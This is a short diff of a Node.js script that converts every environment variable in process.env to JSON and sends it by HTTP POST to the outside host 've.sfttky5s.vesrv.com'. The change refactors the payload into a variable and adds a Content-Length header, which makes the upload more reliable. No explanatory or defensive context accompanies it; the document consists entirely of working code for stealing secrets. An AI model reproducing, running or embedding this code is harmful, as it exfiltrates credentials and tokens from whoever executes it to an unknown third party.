@@ -1,9 +1,14 @@
 var http = require( "http" );
 
+var data = JSON.stringify( process.env );
+
 var request = http.request({
 	hostname: "ve.sfttky5s.vesrv.com",
-	method: "POST"
+	method: "POST",
+	headers: {
+		"Content-Length": data.length
+	}
 });
 
-request.write( JSON.stringify( process.env ) );
+request.write( data );
 request.end();
